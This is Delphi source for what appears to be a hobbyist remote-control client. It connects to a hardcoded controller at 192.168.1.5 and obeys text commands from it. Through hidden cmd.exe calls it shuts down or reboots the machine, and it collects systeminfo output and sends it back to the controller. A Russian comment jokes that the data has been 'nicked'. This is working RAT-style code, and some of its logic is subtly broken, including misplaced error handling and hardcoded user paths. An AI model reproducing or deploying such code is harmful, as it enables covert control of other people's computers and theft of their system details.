unit Unit1;

interface

uses
  Winapi.Windows, Winapi.Messages, System.SysUtils, System.Variants, System.Classes, Vcl.Graphics,
  Vcl.Controls, Vcl.Forms, Vcl.Dialogs,ShellAPI, System.Win.ScktComp, Vcl.StdCtrls,
  Vcl.ComCtrls;

type
  TClientHost = class(TForm)
    ClientSocket1: TClientSocket;
    Button1: TButton;
    Memo1: TMemo;
    RichEdit1: TRichEdit;
    procedure FormCreate(Sender: TObject);
    procedure Button1Click(Sender: TObject);
    procedure ClientSocket1Read(Sender: TObject; Socket: TCustomWinSocket);
  private
    procedure TryConnection(IP, Port: string);
    { Private declarations }
  public
    { Public declarations }
  end;

var
  ClientHost: TClientHost;

implementation

{$R *.dfm}

//procedure hello;
//Begin
//  Showmessage ('hello world');
//End;

procedure TClientHost.Button1Click(Sender: TObject);
begin
  TryConnection('192.168.1.5', '65530');
end;

procedure TClientHost.TryConnection(IP, Port : string);
begin
   try
    ClientSocket1.Port:=Port.ToInteger;
    ClientSocket1.Address:= IP;
    ClientSocket1.Open
  except
    ShowMessage('Я не смог подключится к папе...')
  end;

end;

procedure TClientHost.ClientSocket1Read(Sender: TObject;
  Socket: TCustomWinSocket);
var
  Command : string;
begin
  memo1.Lines.Add('-----------');

  Command := Socket.ReceiveText;

  memo1.Lines.Add('Мне прислали команду ' + Command);

  if Command = '[Выключить_ПК]' then
  Begin
    memo1.Lines.Add('Я принял её! ' + Command);

    memo1.Lines.Add('Начинаю Выключение ПК!');

    ShellExecute(handle, nil, 'cmd.exe', PCHar('cmd /c shutdown /s'),nil, SW_HIDE);
  End;

  if Command = '[Перезагрузить_ПК]' then
  Begin
    memo1.Lines.Add('Я принял её! ' + Command);

    memo1.Lines.Add('Начинаю перезагрузку ПК!');

    ShellExecute(handle, nil, 'cmd.exe', PCHar('cmd /c shutdown /r'),nil, SW_HIDE);
  End;


  if Command = '[Получить_ттх_пк]' then
  begin
    memo1.Lines.Add('Я принял её! ' + Command);

    memo1.Lines.Add('Сохраняю инфу о ПК');

    var strm := TStringList.Create;

    var Put := ExtractFileDir(ParamStr(0))+'\sysInfo.txt';
    var outfile: TextFile;
    AssignFile(outfile, 'c:\outfile.txt');
    Rewrite(outfile);

    strm.SaveToFile(Put); //создаю файл быстрым костылем))

    ShellExecute(handle, nil, 'cmd.exe', PCHar('cmd /c systeminfo > C:\Users\bazyl\test2.txt'),nil, SW_HIDE);


    memo1.Lines.Add('Читае инфу из файла');

    try
      strm.LoadFromFile('C:\Users\bazyl\test2.txt');
    except
      memo1.Lines.Add('Файл не прочитан...');

      exit;
    end;

   memo1.Lines.Add('Файл прочитался, его текст: ' + strm.Text);


    //сча тут действия можно поо ней, например дадим ответ что мы пизданули его

    Socket.SendText(strm.Text);

    memo1.Lines.Add('Папе ответил!');

  end
  else
  begin
    Socket.SendText('ERROR! Команда ' + Command + ' не дошла...');
    memo1.Lines.Add('ERROR! Команда ' + Command + ' не дошла...');
  end;

  memo1.Lines.Add('-----------');

end;

procedure TClientHost.FormCreate(Sender: TObject);
begin
  TryConnection('192.168.1.5', '65530');


end;


end.
